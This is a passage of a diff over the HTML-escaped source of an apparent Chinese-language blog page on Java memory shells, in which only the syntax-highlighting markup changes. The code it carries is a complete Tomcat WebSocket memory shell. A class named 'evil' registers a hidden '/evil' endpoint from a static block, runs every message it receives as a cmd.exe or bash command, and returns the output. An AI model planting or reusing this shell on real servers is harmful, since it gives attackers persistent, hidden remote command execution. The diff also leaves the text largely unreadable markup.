-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;container&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getServletContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getAttribute&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
-&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;config&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Builder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;evil&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/ws&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
-&lt;span class=&#34;n&#34;&gt;container&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;addEndpoint&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;container&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getServletContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getAttribute&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;config&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Builder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;evil&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/ws&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;container&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;addEndpoint&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;h3 id=&#34;demo&#34;&gt;demo&lt;/h3&gt;
 &lt;p&gt;将注入内存马的操作放在static块，加载这个类即可实现内存马注入&lt;/p&gt;
@@ -626,64 +746,64 @@ eventvwr.msc # 事件查看器（查看系统日志，安全日志）
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;org.apache.catalina.core.StandardContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
-&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;org.apache.catalina.loader.WebappClassLoaderBase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
-&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;org.apache.tomcat.websocket.server.WsServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
-
-&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;javax.websocket.*&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
-&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;javax.websocket.server.ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
-&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;javax.websocket.server.ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
-&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.InputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
-
-&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;evil&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Endpoint&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MessageHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Whole&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
-    &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
-        &lt;span class=&#34;n&#34;&gt;WebappClassLoaderBase&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;webappClassLoaderBase&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebappClassLoaderBase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Thread&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;currentThread&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getContextClassLoader&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
-        &lt;span class=&#34;n&#34;&gt;StandardContext&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;standardContext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;StandardContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;webappClassLoaderBase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getResources&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
-        &lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;build&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Builder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;evil&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/evil&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
-        &lt;span class=&#34;n&#34;&gt;WsServerContainer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;attribute&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WsServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;standardContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getServletContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getAttribute&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
-        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
-            &lt;span class=&#34;n&#34;&gt;attribute&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;addEndpoint&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
-            &lt;span class=&#34;c1&#34;&gt;// System.out.println(&amp;#34;ok!&amp;#34;);
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DeploymentException&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
-            &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RuntimeException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
-        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
-    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
-
-    &lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Session&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
-
-    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;onMessage&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
-        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
-            &lt;span class=&#34;kt&#34;&gt;boolean&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iswin&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getProperty&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;os.name&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;toLowerCase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;startsWith&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;windows&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
-            &lt;span class=&#34;n&#34;&gt;Process&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
-            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;iswin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
-                &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getRuntime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;cmd.exe&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/c&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;});&lt;/span&gt;
-            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
-                &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getRuntime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;-c&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;});&lt;/span&gt;
-            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
-
-            &lt;span class=&#34;n&#34;&gt;InputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ips&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
-            &lt;span class=&#34;n&#34;&gt;StringBuilder&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sb&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;StringBuilder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
-
-            &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
-            &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ips&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
-                &lt;span class=&#34;n&#34;&gt;sb&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
-            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
-
-            &lt;span class=&#34;n&#34;&gt;ips&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
-            &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;waitFor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
-            &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getBasicRemote&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;sendText&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sb&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;toString&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
-        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
-            &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;printStackTrace&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
-        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
-    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
-
-    &lt;span class=&#34;nd&#34;&gt;@Override&lt;/span&gt;
-    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;onOpen&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Session&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;EndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
-        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;session&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
-        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;addMessageHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
-    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
-&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;org.apache.catalina.core.StandardContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;org.apache.catalina.loader.WebappClassLoaderBase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;org.apache.tomcat.websocket.server.WsServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;javax.websocket.*&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;javax.websocket.server.ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;javax.websocket.server.ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.InputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
